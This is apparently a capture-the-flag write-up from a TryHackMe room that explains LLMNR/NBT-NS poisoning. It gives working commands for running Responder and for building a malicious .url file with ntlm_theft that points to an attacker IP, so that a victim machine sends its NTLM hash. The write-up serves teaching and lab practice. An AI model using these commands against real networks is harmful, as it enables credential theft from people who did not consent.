## **LLMNR/NBT-NS poisoning**

LLMNR/NBT-NS These are old Windows features used when a computer can't find another one by name.

### Example:

Your Windows tries to access a shared folder `\\fileserver\share`But if it **can’t find "fileserver"**, it asks:

> ❓ "Hey network, who is fileserver?"
> 

Anyone on the network can reply...

So you can use a tool like **Responder** to Trick a user into connecting to our fake server and say:

> 🧑‍💻 "I’m fileserver! Send me your login info!"
> 

Windows believes you and sends you Username and NTLM hash

**Scenario:** In a THM CTF room called **Reset**, I connected to the SMB share **Data** using guest login. I found a folder named **“onboarding”** and noticed that the filenames were changing every few seconds. I assumed there must be an automated process running that modifies these files frequently. Because of this, I decided to try using LLMNR/NBT-NS attacks.

### Step 1: Start Responder

```bash
sudo responder -I tun0
```

- Runs a fake SMB server on your machine
- Waits to catch login attempts

### Step 2: Upload Malicious `.url` File

Using [ntlm_theft](https://github.com/Greenwolf/ntlm_theft) to create a malicious `.url` file.

```bash
python3 ntlm_theft.py -g url -s 10.11.63.57 -f shell
```

- `.url` file points to your IP (`\\YOUR-IP\share`)
- When automatic script opens it, Windows tries to connect to you

### Step 3: Capture the Hash

- Victim’s machine sends their **NTLM hash** to your fake server

**NOTE:** This is another scenario involving LLMNR poisoning. For this attack to work, there must be network traffic generated when a user searches for a name that cannot be resolved. Your machine listens for these requests and responds as the fake server, tricking the user’s computer into connecting to you.
